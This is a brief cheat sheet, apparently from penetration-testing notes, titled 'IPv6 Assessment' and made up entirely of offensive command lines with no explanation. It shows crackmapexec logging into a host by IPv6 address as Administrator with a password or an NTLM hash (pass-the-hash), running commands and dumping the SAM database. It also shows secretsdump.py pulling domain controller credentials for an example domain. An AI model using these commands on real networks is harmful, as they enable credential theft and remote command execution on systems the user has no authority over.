### IPv6 Assessment
| for Example  |
| ------------- |
|crackmapexec 2001:db7::1234:1 -u Administrator -p 'Passw0rd' -x "ipconfig" |
|crackmapexec 2001:db7::1234:1 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86" --sam |
|crackmapexec 2001:db7::1234:1 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86" -x "hostname"|
|python secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86" -just-dc acmebank.loca/Administrator@2001:db7::1234:1 |
|crackmapexec 2001:db7::1234:1 -u Administrator -p 'Passw0rd' -x "ipconfig" |
